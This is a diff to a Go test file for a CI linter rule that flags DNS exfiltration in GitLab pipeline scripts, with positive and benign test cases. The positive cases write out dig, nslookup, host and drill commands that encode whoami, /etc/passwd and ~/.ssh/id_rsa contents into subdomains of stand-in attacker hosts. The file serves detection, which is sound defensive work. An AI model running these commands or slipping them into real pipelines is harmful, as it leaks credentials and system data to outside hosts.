@@ -4,6 +4,7 @@
 package rules
 
 import (
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -19,6 +20,44 @@ func findings083(t *testing.T, yaml string) []finding.Finding {
 		t.Fatalf("parse error: %v", err)
 	}
 	return GL083.Check(doc.Root, "test.yml")
+}
+
+func TestGL083_DNSExfil(t *testing.T) {
+	for _, line := range []string{
+		`dig "$(whoami).attacker.example.com"`,
+		`nslookup "$(cat /etc/passwd | base64 | head -c60).evil.example.com"`,
+		`host "$(hostname).exfil.example.io"`,
+		"drill `id`.exfil.example.net",
+		`make build && dig "$(cat ~/.ssh/id_rsa | base64).x.io"`,
+	} {
+		t.Run(line, func(t *testing.T) {
+			f := findings083(t, "j:\n  script:\n    - "+strconv.Quote(line)+"\n")
+			if len(f) != 1 {
+				t.Fatalf("got %d findings, want 1: %+v", len(f), f)
+			}
+			if f[0].Severity != finding.Warn || !strings.Contains(f[0].Message, "DNS query") {
+				t.Errorf("unexpected finding %+v", f[0])
+			}
+		})
+	}
+}
+
+func TestGL083_DNSExfil_NoFinding(t *testing.T) {
+	for _, line := range []string{
+		`dig example.com`,
+		`nslookup gitlab.com`,
+		`dig +short "$REGISTRY_HOST"`, // plain variable, no command substitution
+		`ssh host "$(cmd)"`,           // host is ssh's argument, not the command
+		`echo "configure digest"`,     // dig/host as substrings, not commands
+		`host example.com`,
+	} {
+		t.Run(line, func(t *testing.T) {
+			f := findings083(t, "j:\n  script:\n    - "+strconv.Quote(line)+"\n")
+			if len(f) != 0 {
+				t.Fatalf("got %d findings, want 0: %+v", len(f), f)
+			}
+		})
+	}
 }
 
 func TestGL083_Payloads(t *testing.T) {
